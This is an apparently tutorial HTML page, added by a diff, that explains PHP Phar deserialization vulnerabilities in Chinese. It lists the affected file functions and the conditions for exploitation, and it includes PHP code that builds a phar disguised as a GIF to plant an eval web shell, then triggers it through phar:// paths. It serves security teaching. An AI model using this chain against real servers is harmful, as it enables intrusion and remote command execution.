@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Phar反序列化 - PHP反序列化学习</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://unpkg.com/lucide@latest"></script>
+  <style>
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .animate-fade-in {
+      animation: fadeIn 0.5s ease-out forwards;
+    }
+    pre {
+      background: #1a1a2e;
+      border-radius: 8px;
+      padding: 16px;
+      overflow-x: auto;
+      font-size: 14px;
+    }
+    code {
+      font-family: 'Courier New', monospace;
+    }
+    .code-block {
+      background: #0d1117;
+      border: 1px solid #30363d;
+      border-radius: 8px;
+      padding: 16px;
+      overflow-x: auto;
+    }
+    .output-block {
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 8px;
+      padding: 16px;
+      font-family: 'Courier New', monospace;
+    }
+  </style>
+</head>
+<body class="min-h-screen bg-gray-900 text-gray-200 font-mono">
+  
+  <!-- Header -->
+  <header class="border-b border-gray-700 bg-gray-950/50 backdrop-blur sticky top-0 z-50">
+    <div class="max-w-7xl mx-auto px-6 py-4">
+      <div class="flex items-center gap-4">
+        <a href="../index.html" class="text-blue-400 hover:text-blue-300 flex items-center gap-2">
+          <i data-lucide="arrow-left" class="w-5 h-5"></i>
+          <span>返回首页</span>
+        </a>
+        <div class="flex-1">
+          <h1 class="text-xl font-bold text-white">Phar 反序列化漏洞</h1>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Main Content -->
+  <main class="max-w-7xl mx-auto px-6 py-8">
+    
+    <!-- 什么是Phar -->
+    <section class="mb-12 animate-fade-in">
+      <div class="bg-red-900/20 border border-red-800 rounded-xl p-6 mb-8">
+        <h2 class="text-xl font-bold text-red-300 mb-3 flex items-center gap-2">
+          <i data-lucide="archive" class="w-5 h-5"></i>
+          什么是 Phar 文件？
+        </h2>
+        <p class="text-gray-300">
+          <strong class="text-white">Phar (PHP Archive)</strong> 是PHP的归档文件格式，类似于Java的Jar。一个Phar文件可以包含多个文件内容，并且可以被PHP直接包含执行。
+        </p>
+      </div>
+    </section>
+
+    <!-- Phar文件结构 -->
+    <section class="mb-12 animate-fade-in" style="animation-delay: 0.1s;">
+      <h2 class="text-2xl font-bold text-white mb-6 flex items-center gap-3">
+        <i data-lucide="folder-tree" class="w-6 h-6 text-yellow-400"></i>
+        Phar 文件结构
+      </h2>
+
+      <div class="bg-gray-800 rounded-xl border border-gray-700 p-6">
+        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4 mb-6">
+          
+          <div class="bg-blue-900/20 border border-blue-800 rounded-lg p-4">
+            <div class="flex items-center gap-2 mb-2">
+              <i data-lucide="file-text" class="w-5 h-5 text-blue-400"></i>
+              <h4 class="text-white font-bold">Stub (存根)</h4>
+            </div>
+            <p class="text-gray-400 text-sm">
+              Phar文件头部标识，包含PHP代码，指定入口文件。如 <code class="text-blue-300"><?php __HALT_COMPILER();</code>
+            </p>
+          </div>
+
+          <div class="bg-green-900/20 border border-green-800 rounded-lg p-4">
+            <div class="flex items-center gap-2 mb-2">
+              <i data-lucide="list" class="w-5 h-5 text-green-400"></i>
+              <h4 class="text-white font-bold">Manifest (清单)</h4>
+            </div>
+            <p class="text-gray-400 text-sm">
+              包含文件中各个文件的元数据，<strong class="text-red-400">其中的metadata会被自动反序列化</strong>
+            </p>
+          </div>
+
+          <div class="bg-purple-900/20 border border-purple-800 rounded-lg p-4">
+            <div class="flex items-center gap-2 mb-2">
+              <i data-lucide="file" class="w-5 h-5 text-purple-400"></i>
+              <h4 class="text-white font-bold">文件内容</h4>
+            </div>
+            <p class="text-gray-400 text-sm">
+              实际包含的文件内容，可以是任意PHP代码或资源文件
+            </p>
+          </div>
+
+          <div class="bg-orange-900/20 border border-orange-800 rounded-lg p-4">
+            <div class="flex items-center gap-2 mb-2">
+              <i data-lucide="shield" class="w-5 h-5 text-orange-400"></i>
+              <h4 class="text-white font-bold">签名</h4>
+            </div>
+            <p class="text-gray-400 text-sm">
+              Phar文件末尾的签名，用于验证文件完整性（可选）
+            </p>
+          </div>
+
+        </div>
+
+        <div class="bg-gray-900/50 rounded-lg p-4">
+          <p class="text-gray-400 text-sm font-mono">
+            <span class="text-blue-400">[Stub]</span> <?php __HALT_COMPILER(); ?> <span class="text-gray-500">// 文件标识</span><br>
+            <span class="text-green-400">[Manifest]</span> metadata <span class="text-gray-500">// 触发反序列化的关键！</span><br>
+            <span class="text-purple-400">[Content]</span> file1.php file2.php <span class="text-gray-500">// 文件内容</span><br>
+            <span class="text-orange-400">[Signature]</span> abc123 <span class="text-gray-500">// 签名</span>
+          </p>
+        </div>
+      </div>
+    </section>
+
+    <!-- 漏洞原理 -->
+    <section class="mb-12 animate-fade-in" style="animation-delay: 0.2s;">
+      <h2 class="text-2xl font-bold text-white mb-6 flex items-center gap-3">
+        <i data-lucide="alert-triangle" class="w-6 h-6 text-red-400"></i>
+        Phar 反序列化漏洞原理
+      </h2>
+
+      <div class="bg-red-900/20 border border-red-800 rounded-xl p-6 mb-6">
+        <div class="flex items-center gap-2 mb-4">
+          <i data-lucide="zap" class="w-6 h-6 text-red-400"></i>
+          <h3 class="text-lg font-bold text-red-300">核心漏洞点</h3>
+        </div>
+        <p class="text-gray-300 mb-4">
+          PHP通过 <code class="text-yellow-300">phar://</code> 伪协议访问Phar文件时，会<strong class="text-white">自动反序列化Manifest中的metadata数据</strong>。
+        </p>
+        <p class="text-gray-400">
+          更可怕的是：<strong class="text-yellow-400">不仅仅是unserialize()</strong>，所有处理文件的函数，只要参数可控并使用 <code class="text-yellow-300">phar://</code> 协议，都可以触发！
+        </p>
+      </div>
+
+      <!-- 受影响的函数 -->
+      <div class="bg-gray-800 rounded-xl border border-gray-700 p-6">
+        <h3 class="text-lg font-bold text-white mb-4">受影响的文件操作函数</h3>
+        
+        <div class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-3">
+          <code class="bg-gray-700 px-3 py-2 rounded text-sm text-orange-300">file_get_contents()</code>
+          <code class="bg-gray-700 px-3 py-2 rounded text-sm text-orange-300">fopen()</code>
+          <code class="bg-gray-700 px-3 py-2 rounded text-sm text-orange-300">file()</code>
+          <code class="bg-gray-700 px-3 py-2 rounded text-sm text-orange-300">include()</code>
+          <code class="bg-gray-700 px-3 py-2 rounded text-sm text-orange-300">require()</code>
+          <code class="bg-gray-700 px-3 py-2 rounded text-sm text-orange-300">is_dir()</code>
+          <code class="bg-gray-700 px-3 py-2 rounded text-sm text-orange-300">file_exists()</code>
+          <code class="bg-gray-700 px-3 py-2 rounded text-sm text-orange-300">filesize()</code>
+          <code class="bg-gray-700 px-3 py-2 rounded text-sm text-orange-300">readfile()</code>
+          <code class="bg-gray-700 px-3 py-2 rounded text-sm text-orange-300">stat()</code>
+          <code class="bg-gray-700 px-3 py-2 rounded text-sm text-orange-300">copy()</code>
+          <code class="bg-gray-700 px-3 py-2 rounded text-sm text-orange-300">unlink()</code>
+        </div>
+      </div>
+    </section>
+
+    <!-- 利用条件 -->
+    <section class="mb-12 animate-fade-in" style="animation-delay: 0.3s;">
+      <h2 class="text-2xl font-bold text-white mb-6 flex items-center gap-3">
+        <i data-lucide="check-circle" class="w-6 h-6 text-green-400"></i>
+        Phar 反序列化利用条件
+      </h2>
+
+      <div class="bg-gray-800 rounded-xl border border-gray-700 p-6">
+        <div class="space-y-4">
+          
+          <div class="flex items-start gap-4 p-4 bg-gray-900/50 rounded-lg border border-gray-700">
+            <div class="w-8 h-8 bg-green-900/30 rounded-full flex items-center justify-center text-green-400 font-bold flex-shrink-0">1</div>
+            <div>
+              <h4 class="text-white font-bold">目标服务器允许上传Phar文件</h4>
+              <p class="text-gray-400 text-sm">可以通过头像上传、文件上传等功能上传恶意Phar文件</p>
+            </div>
+          </div>
+
+          <div class="flex items-start gap-4 p-4 bg-gray-900/50 rounded-lg border border-gray-700">
+            <div class="w-8 h-8 bg-green-900/30 rounded-full flex items-center justify-center text-green-400 font-bold flex-shrink-0">2</div>
+            <div>
+              <h4 class="text-white font-bold">存在可利用的类</h4>
+              <p class="text-gray-400 text-sm">服务器端存在可以通过POP链触发危险操作的类（如自定义类或PHP内置类）</p>
+            </div>
+          </div>
+
+          <div class="flex items-start gap-4 p-4 bg-gray-900/50 rounded-lg border border-gray-700">
+            <div class="w-8 h-8 bg-green-900/30 rounded-full flex items-center justify-center text-green-400 font-bold flex-shrink-0">3</div>
+            <div>
+              <h4 class="text-white font-bold">文件操作函数参数可控</h4>
+              <p class="text-gray-400 text-sm">有地方可以控制文件操作函数的参数，使其使用 <code class="text-yellow-300">phar://</code> 协议</p>
+            </div>
+          </div>
+
+        </div>
+      </div>
+    </section>
+
+    <!-- 利用技巧 -->
+    <section class="mb-12 animate-fade-in" style="animation-delay: 0.4s;">
+      <h2 class="text-2xl font-bold text-white mb-6 flex items-center gap-3">
+        <i data-lucide="settings" class="w-6 h-6 text-cyan-400"></i>
+        利用技巧：伪装图片绕过上传
+      </h2>
+
+      <div class="bg-gray-800 rounded-xl border border-gray-700 p-6">
+        <div class="bg-yellow-900/20 border border-yellow-800 rounded-lg p-4 mb-6">
+          <p class="text-yellow-300">
+            <strong>技巧：</strong>在Phar文件前添加 <code class="text-white">GIF89a</code> 文件头，可以伪装成GIF图片，绕过文件上传类型检测。
+          </p>
+        </div>
+
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+          
+          <!-- 生成Phar -->
+          <div>
+            <h4 class="text-white font-bold mb-3 flex items-center gap-2">
+              <i data-lucide="code" class="w-4 h-4 text-green-400"></i>
+              1. 生成恶意Phar文件
+            </h4>
+            <div class="code-block text-sm">
+<pre><code><span class="text gray-500"><?php</span>
+<span class="text comment">// 创建恶意类</span>
+<span class="text keyword">class</span> <span class="text class-name">Exploit</span> {
+    <span class="text keyword">public</span> $<span class="text variable">filename</span>;
+    <span class="text keyword">public</span> $<span class="text variable">data</span>;
+    
+    <span class="text keyword">public function</span> <span class="text function">__destruct</span>() {
+        <span class="text comment">// 写入文件</span>
+        <span class="text function">file_put_contents</span>(<span class="text variable">$this</span>->filename, <span class="text variable">$this</span>->data);
+    }
+}
+
+<span class="text comment">// 创建Phar对象</span>
+<span class="text variable">phar</span> = <span class="text keyword">new</span> <span class="text class-name">Phar</span>(<span class="text string">"exploit.phar"</span>);
+<span class="text variable">phar</span>-><span class="text function">startBuffering</span>();
+
+<span class="text comment">// 添加恶意类到Phar</span>
+<span class="text variable">phar</span>-><span class="text function">setStub</span>(<span class="text string">'<?php __HALT_COMPILER(); ?>'</span>);
+<span class="text variable">$exploit</span> = <span class="text keyword">new</span> <span class="text class-name">Exploit</span>();
+<span class="text variable">$exploit</span>->filename = <span class="text string">"shell.php"</span>;
+<span class="text variable">$exploit</span>->data = <span class="text string">'<?php eval($_GET["cmd"]); ?>'</span>;
+
+<span class="text comment">// 添加到manifest</span>
+<span class="text variable">phar</span>-><span class="text function">setMetadata</span>(<span class="text variable">$exploit</span>);
+<span class="text variable">phar</span>-><span class="text function">addFromString</span>(<span class="text string">"test.txt"</span>, <span class="text string">"test"</span>);
+
+<span class="text variable">$phar</span>-><span class="text function">stopBuffering</span>();
+
+<span class="text comment">// 伪装成GIF</span>
+<span class="text variable">file_put_contents</span>(<span class="text string">"exploit.gif"</span>,
+    <span class="text string">"GIF89a"</span> . <span class="text function">file_get_contents</span>(<span class="text string">"exploit.phar"</span>)
+);</code></pre>
+            </div>
+          </div>
+
+          <!-- 触发漏洞 -->
+          <div>
+            <h4 class="text-white font-bold mb-3 flex items-center gap-2">
+              <i data-lucide="zap" class="w-4 h-4 text-red-400"></i>
+              2. 触发漏洞
+            </h4>
+            <div class="code-block text-sm">
+<pre><code><span class="text gray-500"><?php</span>
+<span class="text comment">// 假设 exploit.gif 已上传到服务器</span>
+<span class="text comment">// 通过 phar:// 协议触发反序列化</span>
+
+<span class="text variable">file</span> = <span class="text variable">$_GET</span>[<span class="text string">'file'</span>];
+<span class="text comment">// 触发点：file_get_contents 可以是：</span>
+<span class="text comment">// phar://upload/exploit.gif/shell.txt</span>
+
+<span class="text function">file_get_contents</span>(<span class="text string">"phar://"</span> . <span class="text variable">$file</span>);
+
+<span class="text comment">// 或者使用其他文件函数：</span>
+<span class="text comment">// include("phar://upload/exploit.gif/test.txt")</span>
+<span class="text comment">// copy("phar://upload/exploit.gif/test.txt", "out")</span>
+<span class="text comment">// is_dir("phar://upload/exploit.gif/test.txt")</span></code></pre>
+            </div>
+          </div>
+
+        </div>
+      </div>
+    </section>
+
+    <!-- Phar协议特点 -->
+    <section class="mb-12 animate-fade-in" style="animation-delay: 0.5s;">
+      <h2 class="text-2xl font-bold text-white mb-6 flex items-center gap-3">
+        <i data-lucide="info" class="w-6 h-6 text-purple-400"></i>
+        Phar 协议重要特点
+      </h2>
+
+      <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+        
+        <div class="bg-purple-900/20 border border-purple-800 rounded-xl p-6">
+          <h3 class="text-lg font-bold text-purple-300 mb-4">不需要文件包含</h3>
+          <p class="text-gray-300 mb-3">
+            不像普通反序列化需要 <code class="text-yellow-300">unserialize()</code> 被直接调用，Phar可以利用所有文件函数触发。
+          </p>
+          <p class="text-gray-400 text-sm">
+            只要有文件操作且参数可控，就能触发Phar反序列化。
+          </p>
+        </div>
+
+        <div class="bg-blue-900/20 border border-blue-800 rounded-xl p-6">
+          <h3 class="text-lg font-bold text-blue-300 mb-4">不受 allow_url_include 影响</h3>
+          <p class="text-gray-300 mb-3">
+            <code class="text-yellow-300">phar://</code> 是PHP内置协议，不受 <code class="text-yellow-300">allow_url_include</code> 配置限制。
+          </p>
+          <p class="text-gray-400 text-sm">
+            即使关闭了远程文件包含，Phar反序列化依然有效。
+          </p>
+        </div>
+
+        <div class="bg-green-900/20 border border-green-800 rounded-xl p-6">
+          <h3 class="text-lg font-bold text-green-300 mb-4">绕过文件类型检测</h3>
+          <p class="text-gray-300 mb-3">
+            添加GIF89a文件头后，可以伪装成图片文件上传。
+          </p>
+          <p class="text-gray-400 text-sm">
+            Content-Type检测、文件头检测都能绕过。
+          </p>
+        </div>
+
+        <div class="bg-orange-900/20 border border-orange-800 rounded-xl p-6">
+          <h3 class="text-lg font-bold text-orange-300 mb-4">不受限于unserialize参数</h3>
+          <p class="text-gray-300 mb-3">
+            传统反序列化需要找到 <code class="text-yellow-300">unserialize($_POST['data'])</code> 这样的入口点。
+          </p>
+          <p class="text-gray-400 text-sm">
+            Phar只需要文件操作函数参数可控，大大扩展了攻击面。
+          </p>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- Navigation -->
+    <div class="flex justify-between items-center mt-12 pt-8 border-t border-gray-800">
+      <a href="pop-chain.html" class="text-gray-400 hover:text-white flex items-center gap-2">
+        <i data-lucide="arrow-left" class="w-5 h-5"></i>
+        <span>上一节：POP链构造</span>
+      </a>
+      <a href="native-classes.html" class="text-blue-400 hover:text-blue-300 flex items-center gap-2">
+        <span>下一节：PHP原生类利用</span>
+        <i data-lucide="arrow-right" class="w-5 h-5"></i>
+      </a>
+    </div>
+
+  </main>
+
+  <script>
+    lucide.createIcons();
+  </script>
+</body>
+</html>
